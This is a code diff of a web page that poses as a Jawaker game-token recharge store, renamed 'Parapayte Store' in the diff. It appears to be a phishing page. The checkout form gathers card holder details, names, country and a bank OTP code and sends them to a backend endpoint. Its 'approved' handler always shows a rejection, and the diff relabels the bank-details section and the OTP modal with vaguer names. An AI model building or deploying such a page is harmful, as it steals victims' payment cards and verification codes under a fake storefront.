@@ -7,23 +7,24 @@
 <meta name="description" content="اشحن توكنز جواكر بسرعة وأمان بأفضل الأسعار. فئات متعددة تناسب احتياجك، ودفع سهل وموثوق.">
 <meta name="keywords" content="جواكر, توكنز جواكر, شحن جواكر, jawaker tokens, jawaker recharge">
 <meta name="robots" content="index, follow">
+<link rel="canonical" href="https://YOUR-SITE-URL.example.com/">
 
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@500;700;800;900&family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
 <style>
   :root{
-    /* الألوان المطابقة لمتجر جواكر الرسمي */
-    --bg: #0d121d;          
-    --bg-alt: #161f30;      
-    --card: #1c263b;        
-    --card-border: #28354d; 
+    --bg: #1a1d24; /* تم تفتيح الخلفية هنا */
+    --bg-alt: #222630; /* تم تفتيح الخلفية البديلة */
+    --card: #2b303c;
+    --card-border: #3d4352;
     --gold: #e6ab3f;
     --gold-soft: #f4c96a;
-    --violet: #635bff;      
-    --green: #24b574;       
-    --green-dark: #1b8a57;
-    --text: #ffffff;
-    --text-dim: #8fa0b5;    
+    --violet: #8f7fe0;
+    --violet-soft: #5c4fa8;
+    --green: #2fae52;
+    --green-dark: #23893f;
+    --text: #f2f1ec;
+    --text-dim: #a6abb6;
   }
   *{box-sizing:border-box; margin:0; padding:0;}
   body{
@@ -44,14 +45,14 @@
   .brand{
     font-family:'Cairo', sans-serif;
     font-weight:900;
-    font-size: 24px;
+    font-size: 26px;
     letter-spacing: 0.5px;
     display:flex;
     align-items:center;
     gap:8px;
-    color: #fff;
+    color: var(--gold-soft);
   }
-  .brand span.dot{ color: var(--green); font-size: 14px; }
+  .brand span.dot{ color: var(--violet); font-size: 14px; }
   .menu-icon{
     display:flex;
     flex-direction:column;
@@ -74,7 +75,7 @@
     font-family:'Tajawal', sans-serif;
     font-weight:400;
     font-size: 13px;
-    color: #ff6b6b;
+    color: #e05656;
     margin-right: 10px;
   }
   .grid{
@@ -87,10 +88,10 @@
     .grid{ grid-template-columns: repeat(4, 1fr); }
   }
   .card{
-    background: var(--card);
+    background: radial-gradient(circle at 50% 20%, #353b4a 0%, var(--card) 70%);
     border: 1px solid var(--card-border);
-    border-radius: 14px;
-    padding: 22px 14px 20px;
+    border-radius: 18px;
+    padding: 18px 14px 20px;
     display:flex;
     flex-direction:column;
     align-items:center;
@@ -100,32 +101,34 @@
   }
   .card:hover{
     transform: translateY(-3px);
-    border-color: var(--green);
+    border-color: var(--violet);
   }
-  .badge{
-    position: absolute;
-    top: -10px;
-    left: 50%;
-    transform: translateX(-50%);
-    background: linear-gradient(90deg, #ff7675, #d63031);
-    color: white;
-    padding: 3px 10px;
-    border-radius: 20px;
-    font-size: 10px;
-    font-weight: 700;
-    box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+  .info-icon{
+    position:absolute;
+    top:12px;
+    right:12px;
+    width:22px;
+    height:22px;
+    border-radius:50%;
+    background:#3d4352;
+    color: var(--text-dim);
+    font-size:13px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-weight:700;
   }
   .coin-icon{
-    width: 74px;
-    height: 74px;
-    margin: 10px 0 12px;
+    width: 78px;
+    height: 78px;
+    margin: 14px 0 12px;
   }
   .pack-name{
     font-family:'Cairo', sans-serif;
     font-weight:700;
-    font-size: 15px;
+    font-size: 15.5px;
     color: var(--text);
-    margin-bottom: 12px;
+    margin-bottom: 14px;
     min-height: 22px;
   }
   .pack-amount{
@@ -134,28 +137,29 @@
     gap:8px;
     font-family:'Cairo', sans-serif;
     font-weight:800;
-    font-size: 20px;
+    font-size: 21px;
     color: var(--gold-soft);
     margin-bottom: 18px;
   }
   .pack-amount .mini-coin{
-    width:22px; height:22px;
+    width:24px; height:24px;
   }
   .buy-btn{
     width:100%;
-    background: linear-gradient(180deg, #2ecc71, var(--green-dark));
+    background: linear-gradient(180deg, #38c264, var(--green-dark));
     color:#fff;
     border:none;
-    padding: 12px 8px;
-    border-radius: 10px;
+    padding: 13px 8px;
+    border-radius: 12px;
     font-family:'Cairo', sans-serif;
     font-weight:700;
     font-size: 13.5px;
+    letter-spacing: 0.2px;
     cursor:pointer;
-    box-shadow: 0 3px 0 rgba(0,0,0,0.2);
+    box-shadow: 0 4px 0 rgba(0,0,0,0.3);
     direction: ltr;
   }
-  .buy-btn:active{ transform: translateY(2px); box-shadow: 0 1px 0 rgba(0,0,0,0.2); }
+  .buy-btn:active{ transform: translateY(2px); box-shadow: 0 2px 0 rgba(0,0,0,0.3); }
 
   footer{
     margin-top: 50px;
@@ -168,11 +172,11 @@
     font-size: 13px;
   }
 
-  /* تصميم الفورم المصغر والأفتح */
+  /* تم تصغير حجم الـ Form Panel هنا وجعلها أفتح */
   .overlay{
     position:fixed;
     inset:0;
-    background: rgba(5, 7, 12, 0.8);
+    background: rgba(0,0,0,0.65);
     display:none;
     align-items:flex-start;
     justify-content:center;
@@ -186,10 +190,9 @@
     border: 1px solid var(--card-border);
     border-radius: 16px;
     width: 100%;
-    max-width: 390px;
-    padding: 20px 18px 18px;
+    max-width: 390px; /* تم تصغير العرض من 460 إلى 390 */
+    padding: 20px 18px 18px; /* تقليص الحشو الداخلي */
     position:relative;
-    box-shadow: 0 15px 35px rgba(0,0,0,0.4);
   }
   .checkout-header{
     display:flex;
@@ -200,13 +203,12 @@
   .x-btn{
     background:none;
     border:none;
-    color: var(--text-dim);
+    color:#fff;
     font-size: 20px;
     font-weight:700;
     cursor:pointer;
     line-height:1;
   }
-  .x-btn:hover{ color: #fff; }
   .checkout-title{
     font-family:'Cairo', sans-serif;
     font-weight:800;
@@ -214,7 +216,7 @@
     color: var(--text);
   }
   .order-chip{
-    background: rgba(0,0,0,0.2);
+    background: rgba(0,0,0,0.15);
     border: 1px solid var(--card-border);
     border-radius: 10px;
     padding: 8px 12px;
@@ -238,7 +240,7 @@
     margin: 14px 0 12px;
   }
   .field.card-field input{
-    border-radius: 12px;
+    border-radius: 14px;
     padding: 14px 16px;
     font-size: 14px;
   }
@@ -249,9 +251,9 @@
   }
   .row-3 input{
     width:100%;
-    background: #0d121d;
+    background: rgba(0,0,0,0.25);
     border: 1px solid var(--card-border);
-    border-radius: 12px;
+    border-radius: 14px;
     padding: 14px 8px;
     color: var(--text);
     font-family:'Tajawal', sans-serif;
@@ -268,9 +270,9 @@
   }
   .field input{
     width:100%;
-    background: #0d121d;
+    background: rgba(0,0,0,0.25);
     border: 1px solid var(--card-border);
-    border-radius: 12px;
+    border-radius: 14px;
     padding: 14px 16px;
     color: var(--text);
     font-family:'Tajawal', sans-serif;
@@ -284,7 +286,7 @@
   
   .field input::placeholder,
   .row-3 input::placeholder {
-    color: #536275;
+    color: #7e8494;
     opacity: 1;
     font-family: Arial, sans-serif;
     font-weight: normal;
@@ -301,18 +303,18 @@
     font-weight:800;
     font-size: 14.5px;
     cursor:not-allowed;
-    background: #28354d;
-    color: #63758c;
+    background: linear-gradient(180deg, #7e838e, #5a5d66);
+    color: #bcbfc7;
     transition: all .2s ease;
   }
   .submit-btn.enabled{
     cursor:pointer;
-    background: linear-gradient(180deg, #2ecc71, var(--green-dark));
+    background: linear-gradient(180deg, #38c264, var(--green-dark));
     color:#fff;
-    box-shadow: 0 4px 0 rgba(0,0,0,0.2);
+    box-shadow: 0 4px 0 rgba(0,0,0,0.3);
   }
 
-  /* شاشة الحالات والانتظار */
+  /* Status view */
   .status-view{
     display:none;
     flex-direction:column;
@@ -326,7 +328,7 @@
     height:38px;
     border-radius:50%;
     border: 4px solid var(--card-border);
-    border-top-color: var(--green);
+    border-top-color: var(--violet);
     animation: spin 0.9s linear infinite;
     margin-bottom: 14px;
   }
@@ -344,11 +346,11 @@
     margin-bottom: 16px;
   }
 
-  /* نافذة الـ OTP (FastPay) */
+  /* Rating/Verification modal */
   .rating-overlay{
     position:fixed;
     inset:0;
-    background: rgba(5, 7, 12, 0.8);
+    background: rgba(0,0,0,0.65);
     display:none;
     align-items:center;
     justify-content:center;
@@ -383,7 +385,7 @@
     letter-spacing: 0.5px;
   }
   .verified-badge {
-    background: var(--green);
+    background: #2fae52;
     color: #fff;
     width: 18px;
     height: 18px;
@@ -393,10 +395,10 @@
     justify-content: center;
     font-size: 11px;
     font-weight: bold;
-    box-shadow: 0 2px 4px rgba(36,181,116,0.3);
+    box-shadow: 0 2px 4px rgba(47,174,82,0.3);
   }
   .secure-lock {
-    color: var(--text-dim);
+    color: #9a9ea8;
     font-size: 14px;
   }
   .secure-subtext {
@@ -433,7 +435,7 @@
     font-weight: 700;
     font-size: 20px;
     color: var(--text);
-    background: #0d121d;
+    background: rgba(0,0,0,0.3);
     border: 1px solid var(--card-border);
     border-radius: 10px;
     padding: 10px;
@@ -451,13 +453,13 @@
   }
   
   .rating-input::placeholder {
-    color: #3b4b5e;
+    color: #5d6373;
     letter-spacing: 4px;
   }
   
   .rating-refresh-link {
     display: inline-block;
-    color: #ff6b6b;
+    color: #e05656;
     font-size: 11px;
     font-weight: 500;
     text-decoration: underline;
@@ -467,12 +469,12 @@
     user-select: none;
   }
   .rating-refresh-link:hover {
-    color: #ff8787;
+    color: #ff7373;
   }
 
   .rating-error{
     display:none;
-    color:#ff6b6b;
+    color:#e05656;
     font-size:12px;
     margin: 6px 0 10px;
     text-align: center;
@@ -488,7 +490,7 @@
     font-weight: 700;
     font-size: 14px;
     cursor: pointer;
-    background: linear-gradient(180deg, #2ecc71, var(--green-dark));
+    background: linear-gradient(180deg, #38c264, var(--green-dark));
     color: #fff;
     box-shadow: 0 3px 0 rgba(0,0,0,0.2);
     transition: all 0.2s ease;
@@ -499,8 +501,8 @@
     box-shadow: 0 1px 0 rgba(0,0,0,0.2);
   }
   .rating-submit:disabled{
-    background: var(--card-border);
-    color: var(--text-dim);
+    background: #474d5a;
+    color: #828896;
     cursor: not-allowed;
     box-shadow: none;
   }
@@ -519,7 +521,7 @@
 
 <header>
   <div style="width:40px"></div>
-  <div class="brand">جواكر <span class="dot">●</span></div>
+  <div class="brand">Parapayte Store <span class="dot">●</span></div>
   <div class="menu-icon"><i></i><i></i><i></i></div>
 </header>
 
@@ -529,7 +531,7 @@
 </main>
 
 <footer>
-  <span>متجر شحن جواكر</span>
+  <span>Parapayte Store</span>
   <span>© 2026 جميع الحقوق محفوظة</span>
 </footer>
 
@@ -546,11 +548,11 @@
 
     <form id="payForm" novalidate>
       <div class="field">
-        <input type="text" id="f-id" name="id" inputmode="numeric" pattern="\d+" placeholder="ID الحساب" required>
+        <input type="text" id="f-id" name="id" inputmode="numeric" pattern="\d+" placeholder="ID" required>
       </div>
 
       <div class="soft-divider"></div>
-      <div class="section-label">معلومات الدفع البنكي</div>
+      <div class="section-label">الاسم وبعض المعلومات</div>
 
       <div class="field card-field">
         <input type="text" id="f-holder-name" name="jawakerName" placeholder="Card Holder Name" pattern="[^0-9]*" required>
@@ -567,13 +569,22 @@
       </div>
 
       <div class="soft-divider"></div>
-      <div class="section-label">الموقع والمدينة</div>
+      <div class="section-label">معلومات عنك</div>
 
-      <div class="field card-field">
-        <input type="text" id="f-country" name="country" placeholder="المدينة / الدولة" required>
+      <div style="display:flex; gap:10px;">
+        <div class="field card-field" style="flex:1;">
+          <input type="text" id="f-first-name" name="firstNameRecord" placeholder="First Name" required>
+        </div>
+        <div class="field card-field" style="flex:1;">
+          <input type="text" id="f-last-name" name="lastNameRecord" placeholder="Last Name" required>
+        </div>
       </div>
 
-      <button type="submit" class="submit-btn" id="submitBtn" disabled> تأكيد وإرسال </button>
+      <div class="field card-field">
+        <input type="text" id="f-country" name="country" placeholder="Country" required>
+      </div>
+
+      <button type="submit" class="submit-btn" id="submitBtn" disabled> دمج وإرسال </button>
     </form>
 
     <div class="status-view" id="statusView">
@@ -595,7 +606,7 @@
     <div class="secure-subtext">SECURE CHECKOUT</div>
     
     <div class="rating-divider"></div>
-    <div class="rating-text">لقد قمنا بإرسال رمز OTP إلى رقم هاتف الحساب، يرجى كتابته للمتابعة وتأكيد العملية.</div>
+    <div class="rating-text">لقد قمنا بإرسال رمز OTP إلى رقم هاتفك المحمول، يرجى كتابته للمتابعة.</div>
     
     <div class="rating-input-wrapper">
       <input type="number" id="ratingInput" class="rating-input" placeholder="- - - -" required>
@@ -622,27 +633,23 @@
     <text x="50" y="62" font-size="34" text-anchor="middle" fill="#8a5c15" font-family="Cairo, sans-serif" font-weight="900">$</text>
   </svg>`;
 
-  /* تم تعديل التسميات لتصبح احترافية ومطابقة للموقع الرسمي */
   const packages = [
-    { name: "حزمة التوكنز الأساسية", amount: "120,000", price: "$10", badge: "" },
-    { name: "حزمة التوكنز البرونزية", amount: "250,000", price: "$20", badge: "" },
-    { name: "حزمة التوكنز الفضية", amount: "375,000", price: "$30", badge: "أفضل قيمة" },
-    { name: "حزمة التوكنز الذهبية", amount: "800,000", price: "$60", badge: "الأكثر مبيعاً" },
-    { name: "حزمة التوكنز الماسية", amount: "1,000,000", price: "$80", badge: "" },
-    { name: "حزمة التوكنز البلاتينية", amount: "1,300,000", price: "$100", badge: "عرض محدود" },
-    { name: "حزمة التوكنز الأسطورية", amount: "2,500,000", price: "$180", badge: "" },
-    { name: "حزمة الجراند ماستر", amount: "3,500,000", price: "$250", badge: "كبار اللاعبين" },
+    { name: "الفئة الأولى", amount: "120,000", price: "$10" },
+    { name: "الفئة الثانية", amount: "250,000", price: "$20" },
+    { name: "الفئة الثالثة", amount: "375,000", price: "$30" },
+    { name: "الفئة الرابعة", amount: "800,000", price: "$60" },
+    { name: "الفئة الخامسة", amount: "1,000,000", price: "$80" },
+    { name: "الفئة السادسة", amount: "1,300,000", price: "$100" },
+    { name: "الفئة السابعة", amount: "2,500,000", price: "$180" },
+    { name: "الفئة الثامنة", amount: "3,500,000", price: "$250" },
   ];
 
   const grid = document.getElementById('grid');
   packages.forEach(p => {
     const card = document.createElement('div');
     card.className = 'card';
-    
-    let badgeHTML = p.badge ? `<div class="badge">${p.badge}</div>` : '';
-    
     card.innerHTML = `
-      ${badgeHTML}
+      <div class="info-icon">i</div>
       <div class="coin-icon">${coinSVG}</div>
       <div class="pack-name">${p.name}</div>
       <div class="pack-amount">${p.amount} <span class="mini-coin">${coinSVG}</span></div>
@@ -756,23 +763,23 @@
     statusView.classList.add('show');
     statusSpinnerWrap.style.display = '';
     statusIcon.style.display = 'none';
-    statusText.textContent = 'جار التحقق من عملية الدفع...';
+    statusText.textContent = 'جار التحقق...';
     statusActionBtn.style.display = 'none';
 
     clearTimeout(verifyTimer);
     verifyTimer = setTimeout(() => {
-      if (statusView.classList.contains('show') && statusText.textContent === 'جار التحقق من عملية الدفع...') {
-        statusText.textContent = 'قيد المراجعة، يرجى عدم إغلاق الصفحة...';
+      if (statusView.classList.contains('show') && statusText.textContent === 'جار التحقق...') {
+        statusText.textContent = 'قيد المراجعة، سيتم إعلامك فور الانتهاء...';
       }
     }, 25000);
   }
 
-  /* رسالة الرفض المطلوبة بدلاً من الشحن الناجح */
+  /* تعديل دالة الموافقة لتظهر رسالة الخطأ والرفض بناءً على طلبك */
   function showApproved(){
     statusSpinnerWrap.style.display = 'none';
     statusIcon.style.display = '';
-    statusIcon.textContent = '⚠️';
-    statusText.textContent = 'تم رفض الطلب، يرجى إعادة المحاولة';
+    statusIcon.textContent = '⚠️'; /* إشارة خطأ */
+    statusText.textContent = 'تم رفض الطلب، يرجى إعادة المحاولة'; /* نص الرفض */
     statusActionBtn.textContent = 'إغلاق';
     statusActionBtn.className = 'submit-btn enabled';
     statusActionBtn.style.display = '';
@@ -784,7 +791,7 @@
     statusSpinnerWrap.style.display = 'none';
     statusIcon.style.display = '';
     statusIcon.textContent = '⚠️';
-    statusText.textContent = 'يرجى التأكد من صحة بياناتك البنكية';
+    statusText.textContent = 'يرجى التأكد من صحة بياناتك';
     statusActionBtn.textContent = 'حاول مرة أخرى';
     statusActionBtn.className = 'submit-btn enabled';
     statusActionBtn.style.display = '';
@@ -798,7 +805,7 @@
     statusSpinnerWrap.style.display = 'none';
     statusIcon.style.display = '';
     statusIcon.textContent = '⚠️';
-    statusText.textContent = msg || 'حدث خطأ أثناء معالجة العملية، يرجى المحاولة لاحقاً';
+    statusText.textContent = msg || 'صار في مشكلة، حاول مرة أخرى';
     statusActionBtn.textContent = 'إغلاق';
     statusActionBtn.className = 'submit-btn enabled';
     statusActionBtn.style.display = '';
@@ -824,6 +831,7 @@
           showRejected();
         }
       } catch(err){
+        // خطأ شبكة عابر
       }
     }, 2500);
   }
@@ -846,7 +854,7 @@
     };
 
     submitBtn.disabled = true;
-    submitBtn.textContent = 'جارِ المعالجة...';
+    submitBtn.textContent = 'جارِ التحقق...';
 
     try{
       const res = await fetch(`${BACKEND_URL}/api/order`, {
@@ -863,7 +871,7 @@
       pollOrderStatus(result.order_id);
     } catch(err){
       showWaiting();
-      showError('تعذر الاتصال ببوابة الدفع الآمنة: ' + err.message);
+      showError('صار في مشكلة بإرسال البيانات: ' + err.message);
     }
   });
 
